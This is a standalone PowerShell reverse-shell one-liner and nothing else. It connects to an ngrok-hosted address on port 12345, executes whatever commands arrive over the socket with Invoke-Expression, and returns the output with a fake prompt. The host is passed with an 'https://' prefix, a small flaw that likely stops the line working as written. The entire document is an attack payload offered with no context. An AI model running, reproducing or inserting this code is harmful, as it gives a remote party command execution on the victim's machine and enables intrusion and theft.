
$c=New-Object Net.Sockets.TCPClient('https://cc4b-152-59-183-208.ngrok-free.app',12345);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1 | Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$b2=([text.encoding]::ASCII).GetBytes($o2);$s.Write($b2,0,$b2.Length);$s.Flush()};$c.Close()
